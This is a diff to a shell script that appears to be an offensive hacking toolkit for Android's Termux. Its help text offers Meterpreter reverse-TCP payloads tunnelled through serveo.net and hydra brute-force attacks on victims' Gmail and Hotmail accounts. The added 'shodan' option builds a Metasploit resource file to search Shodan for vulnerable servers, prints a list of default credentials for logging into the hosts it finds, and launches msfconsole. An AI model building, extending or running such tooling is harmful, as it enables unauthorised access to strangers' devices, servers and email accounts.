@@ -83,6 +83,7 @@ Arguments  |    options     |    Description
 |               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
 |                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
 |                             LHOST=serveo.net file=outlan.exe
+╰─shodan───➤────────────────➤ Search vulnerable servers using metasploit with shodan
 ╰─bfmail───➤──email─passwd──➤ Start a brute force attack wiyh hydra tool at email(hotmail/gmail) account
 |   ╰──────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
 |   ╰──────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
@@ -388,6 +389,39 @@ elif [ $1 = handler ] && [ $2 ]; then
 	else
 		printf "$R[w]->$W File $2 doesn't exist\n"
 	fi
+elif [ $1 = shodan ]; then
+	if [ ! -e $PREFIX/opt/metasploit-framework/documentation/api/apikey ]; then
+		touch $PREFIX/opt/metasploit-framework/documentation/api/apikey
+	fi
+	APIKEYFILE=$PREFIX/opt/metasploit-framework/documentation/api/apikey
+	if [ ! $(cat $APIKEYFILE) ]; then
+		printf "$Y[?]->$W Type your shodan APIKEY "
+		while read -p ">> " ANSW && [ -z $ANSW ]; do
+                printf "$R[w]-> Go to www.shodan.io to get your APIKEY$W\n"
+		exit
+        done
+        echo $ANSW > $APIKEYFILE
+	fi
+        APIKEY=$(cat $APIKEYFILE)
+	if [ -e $iHAKLAB/.set/shodan/query ]; then
+		printf "$Y[?]->$W Choose a type of search :\n"
+		cat $iHAKLAB/.set/shodan/query | sort
+		echo
+		while read -p ">> " QUERY && [ -z $QUERY ]; do
+			printf "$R"
+		done
+	else
+		printf "$R[w]-> ERROR :$W Not such query file\n"
+	fi
+        echo "use auxiliary/gather/shodan_search" > ~/java/handler/shodan-cam.rc
+        echo "set SHODAN_APIKEY $APIKEY" >> ~/java/handler/shodan-cam.rc
+        echo "set QUERY \"$QUERY\"" >> ~/java/handler/shodan-cam.rc
+        echo "run" >> ~/java/handler/shodan-cam.rc
+	printf "$Y[!]-> If some target need user/passwd you can use those :$W\n"
+	cat $iHAKLAB/.set/shodan/usrpasswd.txt
+	printf "\n\tpress$G ENTER$W to continue\n"
+	read enter
+        msfconsole -q -r ~/java/handler/shodan-cam.rc
 elif [ $1 = bfmail ] && [ -z $2 ]; then
         printf "$R[w]->$W bfmail argument need a mail/victim as option 1$G\n[ex]->$W i-Haklab bfmail victim@gmail.com passwords.txt"
 elif [ $1 = bfmail ] && [ $2 ] && [ -z $3 ]; then
